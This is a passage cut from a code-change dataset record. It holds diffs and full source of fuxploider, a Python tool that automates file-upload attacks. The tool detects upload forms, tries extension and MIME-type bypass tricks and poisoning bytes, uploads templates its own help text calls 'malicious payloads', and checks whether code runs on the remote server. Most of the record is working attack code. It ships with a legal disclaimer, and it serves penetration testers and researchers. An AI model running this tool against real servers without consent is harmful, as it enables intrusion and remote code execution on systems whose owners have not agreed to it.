submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :\n\t\tfu = self.uploadFile(suffix,mime,payload)\n\t\tuploadRes = self.isASuccessfulUpload(fu[0].text)\n\t\tresult = {\"uploaded\":False,\"codeExec\":False}\n\t\tif uploadRes :\n\t\t\tresult[\"uploaded\"] = True\n\t\t\tif self.shouldLog :\n\t\t\t\tself.logger.info(\"\\033[1;32mUpload of '%s' with mime type %s successful\\033[m\",fu[1], mime)\n\t\t\t\n\t\t\tif uploadRes != True :\n\t\t\t\tif self.shouldLog :\n\t\t\t\t\tself.logger.info(\"\\033[1;32m\\tTrue regex matched the following information : %s\\033[m\",uploadRes)\n\n\t\t\tif codeExecRegex and valid_regex(codeExecRegex) and (self.uploadsFolder or self.trueRegex) :\n\t\t\t\turl = None\n\t\t\t\tsecondUrl = None\n\t\t\t\tif self.uploadsFolder :\n\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]\n\t\t\t\t\tfilename = fu[1]\n\t\t\t\t\tsecondUrl = None\n\t\t\t\t\tfor b in getPoisoningBytes() :\n\t\t\t\t\t\tif b in filename :\n\t\t\t\t\t\t\tsecondUrl = b.join(url.split(b)[:-1])\n\t\t\t\telif self.codeExecUrlPattern :\n\t\t\t\t\t#code exec detection through true regex\n\t\t\t\t\turl = self.codeExecUrlPattern.replace(\"$captGroup$\",uploadRes)\n\t\t\t\telse :\n\t\t\t\t\tpass\n\t\t\t\t\t#self.logger.warning(\"Impossible to determine where to find the uploaded payload.\")\n\t\t\t\tif url :\n\t\t\t\t\texecutedCode = self.detectCodeExec(url,codeExecRegex)\n\t\t\t\t\tif executedCode :\n\t\t\t\t\t\tresult[\"codeExec\"] = True\n\t\t\t\tif secondUrl :\n\t\t\t\t\texecutedCode = self.detectCodeExec(secondUrl,codeExecRegex)\n\t\t\t\t\tif executedCode :\n\t\t\t\t\t\tresult[\"codeExec\"] = True\n\t\treturn result\n\n\t#detects html forms and returns a list of beautifulSoup objects (detected forms)\n\tdef detectForms(html) :\n\t\tsoup = BeautifulSoup(html,'html.parser')\n\t\tdetectedForms = soup.find_all(\"form\")\n\t\treturnForms = []\n\t\tif len(detectedForms) > 0 :\n\t\t\tfor f in detectedForms :\n\t\t\t\tfileInputs = f.findChildren(\"input\",{\"type\":\"file\"})\n\t\t\t\tif len(fileInputs) > 0 :\n\t\t\t\t\treturnForms.append((f,fileInputs))\n\n\t\treturn returnForms"}, "/fuxploider.py": {"changes": [{"diff": "\n \ttemplatefd = open(templatesFolder+\"/\"+template[\"filename\"],\"rb\")\n \ttemplatesData[template[\"templateName\"]] = templatefd.read()\n \ttemplatefd.close()\n-\tnastyExt = template[\"nastyExt\"]\n-\tnastyMime = getMime(extensions,nastyExt)\n-\tnastyExtVariants = template[\"extVariants\"]\n-\tfor t in techniques :\n-\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :\n-\t\t\tfor legitExt in up.validExtensions :\n-\t\t\t\tlegitMime = getMime(extensions,legitExt)\n-\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime\n-\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)\n-\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"]})\n+\tnastyExt = template.get(\"nastyExt\")\n+\tnastyMime = None if nastyExt == None else getMime(extensions,nastyExt)\n+\tnastyExtVariants = template.get(\"extVariants\")\n+\tcodeExecURL = template.get(\"codeExecURL\")\n+\tdynamicPayload = template.get(\"dynamicPayload\")\n+\tfor legitExt in up.validExtensions:\n+\t\tlegitMime = getMime(extensions, legitExt)\n+\t\tif nastyExt == None:\n+\t\t\tattempts.append({\"suffix\": \".\"+legitExt, \"mime\": legitMime, \"templateName\": template[\"templateName\"],\n+\t\t\t\t\t\t\t \"codeExecURL\": codeExecURL, \"dynamicPayload\": dynamicPayload})\n+\t\telse:\n+\t\t\tfor t in techniques :\n+\t\t\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :\n+\t\t\t\t\tlegitMime = getMime(extensions,legitExt)\n+\t\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime\n+\t\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)\n+\t\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"],\n+\t\t\t\t\t\t\t\t\t \"codeExecURL\":codeExecURL,\"dynamicPayload\":dynamicPayload})\n \n \n stopThreads = False\n", "add": 18, "remove": 10, "filename": "/fuxploider.py", "badparts": ["\tnastyExt = template[\"nastyExt\"]", "\tnastyMime = getMime(extensions,nastyExt)", "\tnastyExtVariants = template[\"extVariants\"]", "\tfor t in techniques :", "\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :", "\t\t\tfor legitExt in up.validExtensions :", "\t\t\t\tlegitMime = getMime(extensions,legitExt)", "\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime", "\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)", "\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"]})"], "goodparts": ["\tnastyExt = template.get(\"nastyExt\")", "\tnastyMime = None if nastyExt == None else getMime(extensions,nastyExt)", "\tnastyExtVariants = template.get(\"extVariants\")", "\tcodeExecURL = template.get(\"codeExecURL\")", "\tdynamicPayload = template.get(\"dynamicPayload\")", "\tfor legitExt in up.validExtensions:", "\t\tlegitMime = getMime(extensions, legitExt)", "\t\tif nastyExt == None:", "\t\t\tattempts.append({\"suffix\": \".\"+legitExt, \"mime\": legitMime, \"templateName\": template[\"templateName\"],", "\t\t\t\t\t\t\t \"codeExecURL\": codeExecURL, \"dynamicPayload\": dynamicPayload})", "\t\telse:", "\t\t\tfor t in techniques :", "\t\t\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :", "\t\t\t\t\tlegitMime = getMime(extensions,legitExt)", "\t\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime", "\t\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)", "\t\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"],", "\t\t\t\t\t\t\t\t\t \"codeExecURL\":codeExecURL,\"dynamicPayload\":dynamicPayload})"]}, {"diff": " \t\t\tmime = a[\"mime\"]\n \t\t\tpayload = templatesData[a[\"templateName\"]]\n \t\t\tcodeExecRegex = [t[\"codeExecRegex\"] for t in templates if t[\"templateName\"] == a[\"templateName\"]][0]\n+\t\t\tcodeExecURL = a[\"codeExecURL\"]\n+\t\t\tdynamicPayload = a[\"dynamicPayload\"]\n \n-\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)\n+\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex,codeExecURL,dynamicPayload)\n \t\t\tf.a = a\n \t\t\tfutures.append(f)\n", "add": 3, "remove": 1, "filename": "/fuxploider.py", "badparts": ["\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)"], "goodparts": ["\t\t\tcodeExecURL = a[\"codeExecURL\"]", "\t\t\tdynamicPayload = a[\"dynamicPayload\"]", "\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex,codeExecURL,dynamicPayload)"]}], "source": "\n\nimport re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json,concurrent.futures,random from utils import * from UploadForm import UploadForm from threading import Lock version=\"0.5.0\" logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]') logger=logging.getLogger(\"fuxploider\") coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s -%(message)s',level=logging.INFO) logging.getLogger(\"requests\").setLevel(logging.ERROR) templatesFolder=\"payloads\" with open(\"templates.json\",\"r\") as fd: \ttemplates=json.loads(fd.read()) templatesNames=[x[\"templateName\"] for x in templates] templatesSection=\"[TEMPLATES]\\nTemplates are malicious payloads meant to be uploaded on the scanned remote server. Code execution detection is done based on the expected output of the payload.\" templatesSection +=\"\\n\\tDefault templates are the following(name -description): \" for t in templates: \ttemplatesSection+=\"\\n\\t * '\"+t[\"templateName\"]+\"' -\"+t[\"description\"] parser=argparse.ArgumentParser(epilog=templatesSection,description=__doc__, formatter_class=argparse.RawTextHelpFormatter) parser.add_argument(\"-d\", \"--data\", metavar=\"postData\",dest=\"data\", help=\"Additionnal data to be transmitted via POST method. Example: -d \\\"key1=value1&key2=value2\\\"\", type=valid_postData) parser.add_argument(\"--proxy\", metavar=\"proxyUrl\", dest=\"proxy\", help=\"Proxy information. Example: --proxy \\\"user:password@proxy.host:8080\\\"\", type=valid_proxyString) parser.add_argument(\"--proxy-creds\",metavar=\"credentials\",nargs='?',const=True,dest=\"proxyCreds\",help=\"Prompt for proxy credentials at runtime. Format: 'user:pass'\",type=valid_proxyCreds) parser.add_argument(\"-f\",\"--filesize\",metavar=\"integer\",nargs=1,default=[\"10\"],dest=\"size\",help=\"File size to use for files to be created and uploaded(in kB).\") parser.add_argument(\"--cookies\",metavar=\"omnomnom\",nargs=1,dest=\"cookies\",help=\"Cookies to use with HTTP requests. Example: PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG\",type=valid_postData) parser.add_argument(\"--uploads-path\",default=[None],metavar=\"path\",nargs=1,dest=\"uploadsPath\",help=\"Path on the remote server where uploads are put. Example: '/tmp/uploads/'\") parser.add_argument(\"-t\",\"--template\",metavar=\"templateName\",nargs=1,dest=\"template\",help=\"Malicious payload to use for code execution detection. Default is to use every known templates. For a complete list of templates, see the TEMPLATE section.\") parser.add_argument(\"-r\",\"--regex-override\",metavar=\"regex\",nargs=1,dest=\"regexOverride\",help=\"Specify a regular expression to detect code execution. Overrides the default code execution detection regex defined in the template in use.\",type=valid_regex) requiredNamedArgs=parser.add_argument_group('Required named arguments') requiredNamedArgs.add_argument(\"-u\",\"--url\", metavar=\"target\", dest=\"url\",required=True, help=\"Web page URL containing the file upload form to be tested. Example: http://test.com/index.html?action=upload\", type=valid_url) requiredNamedArgs.add_argument(\"--not-regex\", metavar=\"regex\", help=\"Regex matching an upload failure\", type=valid_regex,dest=\"notRegex\") requiredNamedArgs.add_argument(\"--true-regex\",metavar=\"regex\", help=\"Regex matching an upload success\", type=valid_regex, dest=\"trueRegex\") exclusiveArgs=parser.add_mutually_exclusive_group() exclusiveArgs.add_argument(\"-l\",\"--legit-extensions\",metavar=\"listOfExtensions\",dest=\"legitExtensions\",nargs=1,help=\"Legit extensions expected, for a normal use of the form, comma separated. Example: 'jpg,png,bmp'\") exclusiveArgs.add_argument(\"-n\",metavar=\"n\",nargs=1,default=[\"100\"],dest=\"n\",help=\"Number of common extensions to use. Example: -n 100\", type=valid_nArg) exclusiveVerbosityArgs=parser.add_mutually_exclusive_group() exclusiveVerbosityArgs.add_argument(\"-v\",action=\"store_true\",required=False,dest=\"verbose\",help=\"Verbose mode\") exclusiveVerbosityArgs.add_argument(\"-vv\",action=\"store_true\",required=False,dest=\"veryVerbose\",help=\"Very verbose mode\") exclusiveVerbosityArgs.add_argument(\"-vvv\",action=\"store_true\",required=False,dest=\"veryVeryVerbose\",help=\"Much verbose, very log, wow.\") parser.add_argument(\"-s\",\"--skip-recon\",action=\"store_true\",required=False,dest=\"skipRecon\",help=\"Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.\") parser.add_argument(\"-y\",action=\"store_true\",required=False,dest=\"detectAllEntryPoints\",help=\"Force detection of every entry points. Will not stop at first code exec found.\") parser.add_argument(\"-T\",\"--threads\",metavar=\"Threads\",nargs=1,dest=\"nbThreads\",help=\"Number of parallel tasks(threads).\",type=int,default=[4]) exclusiveUserAgentsArgs=parser.add_mutually_exclusive_group() exclusiveUserAgentsArgs.add_argument(\"-U\",\"--user-agent\",metavar=\"useragent\",nargs=1,dest=\"userAgent\",help=\"User-agent to use while requesting the target.\",type=str,default=[requests.utils.default_user_agent()]) exclusiveUserAgentsArgs.add_argument(\"--random-user-agent\",action=\"store_true\",required=False,dest=\"randomUserAgent\",help=\"Use a random user-agent while requesting the target.\") manualFormArgs=parser.add_argument_group('Manual Form Detection arguments') manualFormArgs.add_argument(\"-m\",\"--manual-form-detection\",action=\"store_true\",dest=\"manualFormDetection\",help=\"Disable automatic form detection. Useful when automatic detection fails due to:(1) Form loaded using Javascript(2) Multiple file upload forms in URL.\") manualFormArgs.add_argument(\"--input-name\",metavar=\"image\",dest=\"inputName\",help=\"Name of input for file. Example: <input type=\\\"file\\\" name=\\\"image\\\">\") manualFormArgs.add_argument(\"--form-action\",default=\"\",metavar=\"upload.php\",dest=\"formAction\",help=\"Path of form action. Example: <form method=\\\"POST\\\" action=\\\"upload.php\\\">\") args=parser.parse_args() args.uploadsPath=args.uploadsPath[0] args.nbThreads=args.nbThreads[0] args.userAgent=args.userAgent[0] if args.randomUserAgent: \twith open(\"user-agents.txt\",\"r\") as fd: \t\tnb=0 \t\tfor l in fd: \t\t\tnb +=1 \t\tfd.seek(0) \t\tnb=random.randint(0,nb) \t\tfor i in range(0,nb): \t\t\targs.userAgent=fd.readline()[:-1] if args.template: \targs.template=args.template[0] \tif args.template not in templatesNames: \t\tlogging.warning(\"Unknown template: %s\",args.template) \t\tcont=input(\"Use default templates instead ?[Y/n]\") \t\tif not cont.lower().startswith(\"y\"): \t\t\texit() \telse: \t\ttemplates=[[x for x in templates if x[\"templateName\"]==args.template][0]] if args.regexOverride: \tfor t in templates: \t\tt[\"codeExecRegex\"]=args.regexOverride[0] args.verbosity=0 if args.verbose: \targs.verbosity=1 if args.veryVerbose: \targs.verbosity=2 if args.veryVeryVerbose: \targs.verbosity=3 logger.verbosity=args.verbosity if args.verbosity > 0: \tcoloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s -%(message)s',level=logging.DEBUG) if args.proxyCreds and args.proxy==None: \tparser.error(\"--proxy-creds must be used with --proxy.\") if args.skipRecon and args.legitExtensions==None: \tparser.error(\"-s switch needs -l switch. Cannot skip recon phase without any known entry point.\") args.n=int(args.n[0]) args.size=int(args.size[0]) args.size=1024*args.size if not args.notRegex and not args.trueRegex: \tparser.error(\"At least one detection method must be provided, either with --not-regex or with --true-regex.\") if args.legitExtensions: \targs.legitExtensions=args.legitExtensions[0].split(\",\") if args.cookies: \targs.cookies=postDataFromStringToJSON(args.cookies[0]) if args.manualFormDetection and args.inputName is None: \tparser.error(\"--manual-form-detection requires --input-name\") print(\"\"\"\\033[1;32m ___ _ _ _ | _|_ _ _ _ ___| |___|_|_| |___ ___ | _| | |_'_|. | |. | |. | -_| _| |_| |___|_,_| _|_|___|_|___|___|_| |_| \\033[1m\\033[42m{version \"\"\"+version+\"\"\"}\\033[m \\033[m[!] legal disclaimer: Usage of fuxploider for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program \t\"\"\") if args.proxyCreds==True: \targs.proxyCreds={} \targs.proxyCreds[\"username\"]=input(\"Proxy username: \") \targs.proxyCreds[\"password\"]=getpass.getpass(\"Proxy password: \") now=datetime.datetime.now() print(\"[*] starting at \"+str(now.hour)+\":\"+str(now.minute)+\":\"+str(now.second)) mimeFile=\"mimeTypes.basic\" extensions=loadExtensions(\"file\",mimeFile) tmpLegitExt=[] if args.legitExtensions: \targs.legitExtensions=[x.lower() for x in args.legitExtensions] \tfoundExt=[a[0] for a in extensions] \tfor b in args.legitExtensions: \t\tif b in foundExt: \t\t\ttmpLegitExt.append(b) \t\telse: \t\t\tlogging.warning(\"Extension %s can't be found as a valid/known extension with associated mime type.\",b) args.legitExtensions=tmpLegitExt postData=postDataFromStringToJSON(args.data) s=requests.Session() if args.cookies: \tfor key in args.cookies.keys(): \t\ts.cookies[key]=args.cookies[key] s.headers={'User-Agent':args.userAgent} s.trust_env=False if args.proxy: \tif args.proxy[\"username\"] and args.proxy[\"password\"] and args.proxyCreds: \t\tlogging.warning(\"Proxy username and password provided by the --proxy-creds switch replaces credentials provided using the --proxy switch\") \tif args.proxyCreds: \t\tproxyUser=args.proxyCreds[\"username\"] \t\tproxyPass=args.proxyCreds[\"password\"] \telse: \t\tproxyUser=args.proxy[\"username\"] \t\tproxyPass=args.proxy[\"password\"] \tproxyProtocol=args.proxy[\"protocol\"] \tproxyHostname=args.proxy[\"hostname\"] \tproxyPort=args.proxy[\"port\"] \tproxy=\"\" \tif proxyProtocol !=None: \t\tproxy +=proxyProtocol+\"://\" \telse: \t\tproxy +=\"http://\" \tif proxyUser !=None and proxyPass !=None: \t\tproxy +=proxyUser+\":\"+proxyPass+\"@\" \tproxy +=proxyHostname \tif proxyPort !=None: \t\tproxy +=\":\"+proxyPort \tif proxyProtocol==\"https\": \t\tproxies={\"https\":proxy} \telse: \t\tproxies={\"http\":proxy,\"https\":proxy} \ts.proxies.update(proxies) if args.manualFormDetection: \tif args.formAction==\"\": \t\tlogger.warning(\"Using Manual Form Detection and no action specified with --form-action. Defaulting to empty string -meaning form action will be set to --url parameter.\") \tup=UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath,args.url,args.formAction,args.inputName) else: \tup=UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath) \tup.setup(args.url) up.threads=args.nbThreads uploadURL=up.uploadUrl fileInput={\"name\":up.inputName} a=datetime.datetime.now() if not args.skipRecon: \tif len(args.legitExtensions) > 0: \t\tn=up.detectValidExtensions(extensions,args.n,args.legitExtensions) \telse: \t\tn=up.detectValidExtensions(extensions,args.n) \tlogger.info(\" else: \tlogger.info(\" \tup.validExtensions=args.legitExtensions if up.validExtensions==[]: \tlogger.error(\"No valid extension found.\") \texit() b=datetime.datetime.now() print(\"Extensions detection: \"+str(b-a)) cont=input(\"Start uploading payloads ?[Y/n]: \") up.shouldLog=True if cont.lower().startswith(\"y\") or cont==\"\": \tpass else: \texit(\"Exiting.\") entryPoints=[] up.stopThreads=True with open(\"techniques.json\",\"r\") as rawTechniques: \ttechniques=json.loads(rawTechniques.read()) logger.info(\" c=datetime.datetime.now() nbOfEntryPointsFound=0 attempts=[] templatesData={} for template in templates: \ttemplatefd=open(templatesFolder+\"/\"+template[\"filename\"],\"rb\") \ttemplatesData[template[\"templateName\"]]=templatefd.read() \ttemplatefd.close() \tnastyExt=template[\"nastyExt\"] \tnastyMime=getMime(extensions,nastyExt) \tnastyExtVariants=template[\"extVariants\"] \tfor t in techniques: \t\tfor nastyVariant in[nastyExt]+nastyExtVariants: \t\t\tfor legitExt in up.validExtensions: \t\t\t\tlegitMime=getMime(extensions,legitExt) \t\t\t\tmime=legitMime if t[\"mime\"]==\"legit\" else nastyMime \t\t\t\tsuffix=t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant) \t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"]}) stopThreads=False attemptsTested=0 with concurrent.futures.ThreadPoolExecutor(max_workers=args.nbThreads) as executor: \tfutures=[] \ttry: \t\tfor a in attempts: \t\t\tsuffix=a[\"suffix\"] \t\t\tmime=a[\"mime\"] \t\t\tpayload=templatesData[a[\"templateName\"]] \t\t\tcodeExecRegex=[t[\"codeExecRegex\"] for t in templates if t[\"templateName\"]==a[\"templateName\"]][0] \t\t\tf=executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex) \t\t\tf.a=a \t\t\tfutures.append(f) \t\tfor future in concurrent.futures.as_completed(futures): \t\t\tres=future.result() \t\t\tattemptsTested +=1 \t\t\tif not stopThreads: \t\t\t\tif res[\"codeExec\"]: \t\t\t\t\tfoundEntryPoint=future.a \t\t\t\t\tlogging.info(\"\\033[1m\\033[42mCode execution obtained('%s','%s','%s')\\033[m\",foundEntryPoint[\"suffix\"],foundEntryPoint[\"mime\"],foundEntryPoint[\"templateName\"]) \t\t\t\t\tnbOfEntryPointsFound +=1 \t\t\t\t\tentryPoints.append(foundEntryPoint) \t\t\t\t\tif not args.detectAllEntryPoints: \t\t\t\t\t\traise KeyboardInterrupt \texcept KeyboardInterrupt: \t\tstopThreads=True \t\texecutor.shutdown(wait=False) \t\texecutor._threads.clear() \t\tconcurrent.futures.thread._threads_queues.clear() \t\tlogger.setLevel(logging.CRITICAL) \t\tlogger.verbosity=-1 d=datetime.datetime.now() print() logging.info(\"%s entry point(s) found using %s HTTP requests.\",nbOfEntryPointsFound,up.httpRequests) print(\"Found the following entry points: \") print(entryPoints) ", "sourceWithComments": "#!/usr/bin/python3\nimport re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json,concurrent.futures,random\nfrom utils import *\nfrom UploadForm import UploadForm\nfrom threading import Lock\n#signal.signal(signal.SIGINT, quitting)\nversion = \"0.5.0\"\nlogging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')\nlogger = logging.getLogger(\"fuxploider\")\n\ncoloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.INFO)\nlogging.getLogger(\"requests\").setLevel(logging.ERROR)\n\n#################### TEMPLATES DEFINITION HERE ######################\ntemplatesFolder = \"payloads\"\nwith open(\"templates.json\",\"r\") as fd :\n\ttemplates = json.loads(fd.read())\n#######################################################################\ntemplatesNames = [x[\"templateName\"] for x in templates]\ntemplatesSection = \"[TEMPLATES]\\nTemplates are malicious payloads meant to be uploaded on the scanned remote server. Code execution detection is done based on the expected output of the payload.\"\ntemplatesSection += \"\\n\\tDefault templates are the following (name - description) : \"\nfor t in templates :\n\ttemplatesSection+=\"\\n\\t  * '\"+t[\"templateName\"]+\"' - \"+t[\"description\"]\n\nparser = argparse.ArgumentParser(epilog=templatesSection,description=__doc__, formatter_class=argparse.RawTextHelpFormatter)\nparser.add_argument(\"-d\", \"--data\", metavar=\"postData\",dest=\"data\", help=\"Additionnal data to be transmitted via POST method. Example : -d \\\"key1=value1&key2=value2\\\"\", type=valid_postData)\nparser.add_argument(\"--proxy\", metavar=\"proxyUrl\", dest=\"proxy\", help=\"Proxy information. Example : --proxy \\\"user:password@proxy.host:8080\\\"\", type=valid_proxyString)\nparser.add_argument(\"--proxy-creds\",metavar=\"credentials\",nargs='?',const=True,dest=\"proxyCreds\",help=\"Prompt for proxy credentials at runtime. Format : 'user:pass'\",type=valid_proxyCreds)\nparser.add_argument(\"-f\",\"--filesize\",metavar=\"integer\",nargs=1,default=[\"10\"],dest=\"size\",help=\"File size to use for files to be created and uploaded (in kB).\")\nparser.add_argument(\"--cookies\",metavar=\"omnomnom\",nargs=1,dest=\"cookies\",help=\"Cookies to use with HTTP requests. Example : PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG\",type=valid_postData)\nparser.add_argument(\"--uploads-path\",default=[None],metavar=\"path\",nargs=1,dest=\"uploadsPath\",help=\"Path on the remote server where uploads are put. Example : '/tmp/uploads/'\")\nparser.add_argument(\"-t\",\"--template\",metavar=\"templateName\",nargs=1,dest=\"template\",help=\"Malicious payload to use for code execution detection. Default is to use every known templates. For a complete list of templates, see the TEMPLATE section.\")\nparser.add_argument(\"-r\",\"--regex-override\",metavar=\"regex\",nargs=1,dest=\"regexOverride\",help=\"Specify a regular expression to detect code execution. Overrides the default code execution detection regex defined in the template in use.\",type=valid_regex)\nrequiredNamedArgs = parser.add_argument_group('Required named arguments')\nrequiredNamedArgs.add_argument(\"-u\",\"--url\", metavar=\"target\", dest=\"url\",required=True, help=\"Web page URL containing the file upload form to be tested. Example : http://test.com/index.html?action=upload\", type=valid_url)\nrequiredNamedArgs.add_argument(\"--not-regex\", metavar=\"regex\", help=\"Regex matching an upload failure\", type=valid_regex,dest=\"notRegex\")\nrequiredNamedArgs.add_argument(\"--true-regex\",metavar=\"regex\", help=\"Regex matching an upload success\", type=valid_regex, dest=\"trueRegex\")\n\nexclusiveArgs = parser.add_mutually_exclusive_group()\nexclusiveArgs.add_argument(\"-l\",\"--legit-extensions\",metavar=\"listOfExtensions\",dest=\"legitExtensions\",nargs=1,help=\"Legit extensions expected, for a normal use of the form, comma separated. Example : 'jpg,png,bmp'\")\nexclusiveArgs.add_argument(\"-n\",metavar=\"n\",nargs=1,default=[\"100\"],dest=\"n\",help=\"Number of common extensions to use. Example : -n 100\", type=valid_nArg)\n\nexclusiveVerbosityArgs = parser.add_mutually_exclusive_group()\nexclusiveVerbosityArgs.add_argument(\"-v\",action=\"store_true\",required=False,dest=\"verbose\",help=\"Verbose mode\")\nexclusiveVerbosityArgs.add_argument(\"-vv\",action=\"store_true\",required=False,dest=\"veryVerbose\",help=\"Very verbose mode\")\nexclusiveVerbosityArgs.add_argument(\"-vvv\",action=\"store_true\",required=False,dest=\"veryVeryVerbose\",help=\"Much verbose, very log, wow.\")\n\nparser.add_argument(\"-s\",\"--skip-recon\",action=\"store_true\",required=False,dest=\"skipRecon\",help=\"Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.\")\nparser.add_argument(\"-y\",action=\"store_true\",required=False,dest=\"detectAllEntryPoints\",help=\"Force detection of every entry points. Will not stop at first code exec found.\")\nparser.add_argument(\"-T\",\"--threads\",metavar=\"Threads\",nargs=1,dest=\"nbThreads\",help=\"Number of parallel tasks (threads).\",type=int,default=[4])\n\nexclusiveUserAgentsArgs = parser.add_mutually_exclusive_group()\nexclusiveUserAgentsArgs.add_argument(\"-U\",\"--user-agent\",metavar=\"useragent\",nargs=1,dest=\"userAgent\",help=\"User-agent to use while requesting the target.\",type=str,default=[requests.utils.default_user_agent()])\nexclusiveUserAgentsArgs.add_argument(\"--random-user-agent\",action=\"store_true\",required=False,dest=\"randomUserAgent\",help=\"Use a random user-agent while requesting the target.\")\n\nmanualFormArgs = parser.add_argument_group('Manual Form Detection arguments')\nmanualFormArgs.add_argument(\"-m\",\"--manual-form-detection\",action=\"store_true\",dest=\"manualFormDetection\",help=\"Disable automatic form detection. Useful when automatic detection fails due to: (1) Form loaded using Javascript (2) Multiple file upload forms in URL.\")\nmanualFormArgs.add_argument(\"--input-name\",metavar=\"image\",dest=\"inputName\",help=\"Name of input for file. Example: <input type=\\\"file\\\" name=\\\"image\\\">\")\nmanualFormArgs.add_argument(\"--form-action\",default=\"\",metavar=\"upload.php\",dest=\"formAction\",help=\"Path of form action. Example: <form method=\\\"POST\\\" action=\\\"upload.php\\\">\")\n\nargs = parser.parse_args()\nargs.uploadsPath = args.uploadsPath[0]\nargs.nbThreads = args.nbThreads[0]\nargs.userAgent = args.userAgent[0]\n\nif args.randomUserAgent :\n\twith open(\"user-agents.txt\",\"r\") as fd :\n\t\tnb = 0\n\t\tfor l in fd :\n\t\t\tnb += 1\n\t\tfd.seek(0)\n\t\tnb = random.randint(0,nb)\n\t\tfor i in range(0,nb) :\n\t\t\targs.userAgent = fd.readline()[:-1]\n\nif args.template :\n\targs.template = args.template[0]\n\tif args.template not in templatesNames :\n\t\tlogging.warning(\"Unknown template : %s\",args.template)\n\t\tcont = input(\"Use default templates instead ? [Y/n]\")\n\t\tif not cont.lower().startswith(\"y\") :\n\t\t\texit()\n\telse :\n\t\ttemplates = [[x for x in templates if x[\"templateName\"] == args.template][0]]\nif args.regexOverride :\n\tfor t in templates :\n\t\tt[\"codeExecRegex\"] = args.regexOverride[0]\n\nargs.verbosity = 0\nif args.verbose :\n\targs.verbosity = 1\nif args.veryVerbose :\n\targs.verbosity = 2\nif args.veryVeryVerbose :\n\targs.verbosity = 3\nlogger.verbosity = args.verbosity\nif args.verbosity > 0 :\n\tcoloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.DEBUG)\n\n\nif args.proxyCreds and args.proxy == None :\n\tparser.error(\"--proxy-creds must be used with --proxy.\")\n\nif args.skipRecon and args.legitExtensions == None :\n\tparser.error(\"-s switch needs -l switch. Cannot skip recon phase without any known entry point.\")\n\nargs.n = int(args.n[0])\nargs.size = int(args.size[0])\nargs.size = 1024*args.size\n\nif not args.notRegex and not args.trueRegex :\n\tparser.error(\"At least one detection method must be provided, either with --not-regex or with --true-regex.\")\n\nif args.legitExtensions :\n\targs.legitExtensions = args.legitExtensions[0].split(\",\")\n\nif args.cookies :\n\targs.cookies = postDataFromStringToJSON(args.cookies[0])\n\nif args.manualFormDetection and args.inputName is None:\n\tparser.error(\"--manual-form-detection requires --input-name\")\n\nprint(\"\"\"\\033[1;32m\n                                     \n ___             _     _   _         \n|  _|_ _ _ _ ___| |___|_|_| |___ ___ \n|  _| | |_'_| . | | . | | . | -_|  _|\n|_| |___|_,_|  _|_|___|_|___|___|_|  \n            |_|                      \n\n\\033[1m\\033[42m{version \"\"\"+version+\"\"\"}\\033[m\n\n\\033[m[!] legal disclaimer : Usage of fuxploider for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\t\"\"\")\nif args.proxyCreds == True :\n\targs.proxyCreds = {}\n\targs.proxyCreds[\"username\"] = input(\"Proxy username : \")\n\targs.proxyCreds[\"password\"] = getpass.getpass(\"Proxy password : \")\n\nnow = datetime.datetime.now()\n\nprint(\"[*] starting at \"+str(now.hour)+\":\"+str(now.minute)+\":\"+str(now.second))\n\n#mimeFile = \"mimeTypes.advanced\"\nmimeFile = \"mimeTypes.basic\"\nextensions = loadExtensions(\"file\",mimeFile)\ntmpLegitExt = []\nif args.legitExtensions 